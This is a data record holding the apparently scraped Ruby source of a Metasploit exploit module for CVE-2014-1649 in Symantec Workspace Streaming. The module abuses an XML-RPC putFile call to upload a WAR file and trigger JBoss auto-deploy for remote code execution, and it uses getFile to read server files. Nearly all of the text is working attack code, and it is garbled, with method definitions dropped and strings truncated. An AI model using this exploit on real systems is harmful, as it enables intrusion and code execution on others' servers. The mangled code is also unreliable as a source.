{
    "text": "vul_name : Symantec Workspace Streaming Arbitrary File Upload ， vul_cve : CVE-2014-1649 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， require 'rexml/document' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : FileDropper ， include REXML ， super ( update_info ( info ,  ， 'Name' => 'Symantec Workspace Streaming Arbitrary File Upload' ,  ， 'Description' => %q{ ， This module exploits a code execution flaw in Symantec Workspace Streaming. The ， vulnerability exists in the ManagementAgentServer.putFile XMLRPC call exposed by the ， as_agent.exe service , which allows for uploading arbitrary files under the server root. ， This module abuses the auto deploy feature in the JBoss as_ste.exe instance in order ， to achieve remote code execution. This module has been tested successfully on Symantec ， Workspace Streaming 6.1 SP8 and Windows 2003 SP2. Abused services listen on a single ， machine deployment , and also in the backend role in a multiple machine deployment. ， } ,  ， 'Author' => ，  [  ， 'rgod <rgod [ at ] autistici.org>' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2014-1649' ]  ,  ，  [ 'BID' , '67189' ]  ,  ，  [ 'ZDI' , '14-127' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => 'java' ,  ， 'Arch' => ARCH_JAVA ,  ， 'Targets' => ，  [  ，  [ 'Symantec Workspace Streaming 6.1 SP8 / Java Universal' , {} ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'May 12 2014' )  ， register_options (  ，  [  ， Opt : RPORT ( 9855 )  ,  # as_agent.exe ( afuse XMLRPC to upload arbitrary file )  ， OptPort.new ( 'STE_PORT' ,  [ true , \"The remote as_ste.exe AS server port\" , 9832 ]  )  ,  # as_ste.exe ( abuse jboss auto deploy )  ，  ]  , self.class )  ， end ， res = send_request_cgi (  ， { ， 'uri' => normalize_uri ( \"/\" , \"xmlrpc\" )  ,  ， 'method' => 'POST' ,  ， 'ctype' => 'text/xml ; charset=UTF-8' ,  ， 'data' => xml ， } )  ， res ， end ， xml = Document.new ， xml.add_element (  ， \"methodCall\" ,  ， { ， 'xmlns : ex' => \" ， } )  ， method_name = xml.root.add_element ( \"methodName\" )  ， method_name.text = \"ManagementAgentServer.getFile\" ， params = xml.root.add_element ( \"params\" )  ， param_server_root = params.add_element ( \"param\" )  ， value_server_root = param_server_root.add_element ( \"value\" )  ， value_server_root.text = \" * AWESE\" ， param_file_type = params.add_element ( \"param\" )  ， value_file_type = param_file_type.add_element ( \"value\" )  ， type_file_type = value_file_type.add_element ( \"i4\" )  ， type_file_type.text = \"0\" # build path from the server root directory ， param_file_name = params.add_element ( \"param\" )  ， value_file_name = param_file_name.add_element ( \"value\" )  ， value_file_name.text = file_path ， param_file_binary = params.add_element ( \"param\" )  ， value_file_binary = param_file_binary.add_element ( \"value\" )  ， type_file_binary = value_file_binary.add_element ( \"boolean\" )  ， type_file_binary.text = \"0\" ， xml XMLDecl.new ( \"1.0\" , \"UTF-8\" )  ， xml.to_s ， end ， xml = Document.new ， xml.add_element (  ， \"methodCall\" ,  ， { ， 'xmlns : ex' => \" ， } )  ， method_name = xml.root.add_element ( \"methodName\" )  ， method_name.text = \"ManagementAgentServer.putFile\" ， params = xml.root.add_element ( \"params\" )  ， param_server_root = params.add_element ( \"param\" )  ， value_server_root = param_server_root.add_element ( \"value\" )  ， value_server_root.text = \" * AWESE\" ， param_file_type = params.add_element ( \"param\" )  ， value_file_type = param_file_type.add_element ( \"value\" )  ， type_file_type = value_file_type.add_element ( \"i4\" )  ， type_file_type.text = \"0\" # build path from the server root directory ， param_file = params.add_element ( \"param\" )  ， value_file = param_file.add_element ( \"value\" )  ， type_value_file = value_file.add_element ( \"ex : serializable\" )  ， type_value_file.text = file ， xml XMLDecl.new ( \"1.0\" , \"UTF-8\" )  ， xml.to_s ， end ， def build_soap_check_put ， xml = Document.new ， xml.add_element (  ， \"methodCall\" ,  ， { ， 'xmlns : ex' => \" ， } )  ， method_name = xml.root.add_element ( \"methodName\" )  ， method_name.text = \"ManagementAgentServer.putFile\" ， xml.root.add_element ( \"params\" )  ， xml XMLDecl.new ( \"1.0\" , \"UTF-8\" )  ， xml.to_s ， end ， doc = Document.new ( xml )  ， file = XPath.first ( doc , \"methodResponse/params/param/value/ex : serializable\" )  ， unless file.nil? ， file = Rex : Text.decode_base64 ( file.text )  ， end ， file ， end ， xml_call = build_soap_get_file ( path )  ， file = nil ， res = send_xml_rpc_request ( xml_call )  ， file = parse_method_response ( res.body.to_s )  ， end ， file ， end ， result = nil ， xml_call = build_soap_put_file ( file )  ， res = send_xml_rpc_request ( xml_call )  ， result = parse_method_response ( res.body.to_s )  ， end ， result ， end ， result = false ， java_file = build_java_file_info ( \" # {dst} # {war_name}\" , war )  ， java_file = Rex : Text.encode_base64 ( java_file )  ， res = put_file ( java_file )  ， result = true ， end ， result ， end ， def jboss_deploy_path ， path = nil ， leak = get_file ( \"bin/CreateDatabaseSchema.cmd\" )  ， path = $ 1 ， end ， path ， end ， def check",
    "time": "2014.05.20"
}